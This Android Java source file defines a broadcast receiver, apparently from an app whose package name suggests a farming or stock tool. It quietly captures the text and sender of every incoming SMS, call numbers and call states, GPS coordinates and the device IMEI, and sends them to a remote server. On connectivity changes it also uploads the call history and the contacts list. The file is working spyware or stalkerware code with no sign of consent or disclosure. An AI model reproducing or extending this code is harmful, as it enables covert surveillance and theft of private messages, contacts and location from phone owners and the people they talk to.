package pkks.stock.farmer.testing;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import static android.Manifest.permission.ACCESS_FINE_LOCATION;
import static android.Manifest.permission.READ_CALL_LOG;
import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.RECEIVE_SMS;


public class ReceiverCall extends BroadcastReceiver {
    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    // private static Date callStartTime;
    private static boolean isIncoming;
    private static String savedNumber;  //because the passed incoming is only valid in ringing


    SendRequestToServer sendRequestToServer;
    SystemDetails systemDetails;
    private String stateStr = null;
    private String number = null;
    private String lat = "0.0";
    private String lang = "0.0";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (sendRequestToServer == null) {
            sendRequestToServer = new SendRequestToServer(context);
        }
        if (systemDetails == null) {
            systemDetails = new SystemDetails(context);
        }


        if (intent.getAction().equals(Myservices.SERVICE_CALL)) {
            context.startService(new Intent(context, Myservices.class));
        }
        if (intent.getAction().equals("android.net.conn.CONNECTIVITY_CHANGE")) {
            if (NetworkUtil.getConnectivityStatusString(context).equals("0")) {
                Log.v("Mobile data", "enabled");
                new SendAllHistoryToServer(context).execute();
                new SendAllContactsToServer(context).execute();

            }

        }

        if (intent.getAction().equals("android.gps.location")) {


            lat = intent.getExtras().getString("Latitude");
            lang = intent.getExtras().getString("Longitude");

            sendRequestToServer.valuesToServer("Location-Receive", "", "", "to", SystemDetails.getDate(), lat, lang, SystemDetails.getIMEI(), null);

        }

        if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
            savedNumber = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
        } else {
            int state = 0;
            try {
                stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
                number = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);


            } catch (Exception e) {
                e.printStackTrace();
            }

            if (stateStr != null && number != null)
                try {
                    if (stateStr.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        state = TelephonyManager.CALL_STATE_IDLE;
                    } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        state = TelephonyManager.CALL_STATE_OFFHOOK;
                    } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                        state = TelephonyManager.CALL_STATE_RINGING;
                    }


                    onCallStateChanged(context, state, number);
                } catch (Exception e) {
                    e.printStackTrace();
                }

        }


        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            final Bundle bundle = intent.getExtras();
            try {

                if (bundle != null) {

                    final Object[] pdusObj = (Object[]) bundle.get("pdus");

                    for (int i = 0; i < pdusObj.length; i++) {

                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                        String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                        String senderNum = phoneNumber;
                        String message = currentMessage.getDisplayMessageBody();


                        sendRequestToServer.valuesToServer("SMS-Receive", message, senderNum, "to", SystemDetails.getDate(), lat, lang, SystemDetails.getIMEI(), null);


                    } // end for loop
                } // bundle is null

            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception smsReceiver" + e);

            }
        }


    }


    private void onCallStateChanged(Context context, int state, String number) {

        if (lastState == state) {
            //No change, debounce extras
            return;
        }
        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                isIncoming = true;
                //callStartTime = new Date();
                savedNumber = number;
                //onIncomingCallStarted(context, number, callStartTime);


                sendRequestToServer.valuesToServer("IncomingCall", stateStr, savedNumber, "to", SystemDetails.getDate(), lat, lang, SystemDetails.getIMEI(), null);


                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
                if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                    isIncoming = false;
                    //callStartTime = new Date();
                    //onOutgoingCallStarted(context, savedNumber, callStartTime);

                    sendRequestToServer.valuesToServer("OutgoingCall", stateStr, savedNumber, "to", SystemDetails.getDate(), lat, lang, SystemDetails.getIMEI(), null);


                }
                break;
            case TelephonyManager.CALL_STATE_IDLE:
                //Went to idle-  this is the end of a call.  What type depends on previous state(s)
                if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                    //Ring but no pickup-  a miss
                    //onMissedCall(context, savedNumber, callStartTime);

                    sendRequestToServer.valuesToServer("MissedCall", stateStr, savedNumber, "to", SystemDetails.getDate(), lat, lang, SystemDetails.getIMEI(), null);


                } else if (isIncoming) {
                    //onIncomingCallEnded(context, savedNumber, callStartTime, new Date());

                    sendRequestToServer.valuesToServer("IncomingCallEnded", stateStr, savedNumber, "to", SystemDetails.getDate(), lat, lang, SystemDetails.getIMEI(), null);
                } else {
                    //onOutgoingCallEnded(context, savedNumber, callStartTime, new Date());

                    sendRequestToServer.valuesToServer("OutgoingCallEnded", stateStr, savedNumber, "to", SystemDetails.getDate(), lat, lang, SystemDetails.getIMEI(), null);
                }
                break;

        }
        lastState = state;
    }

}
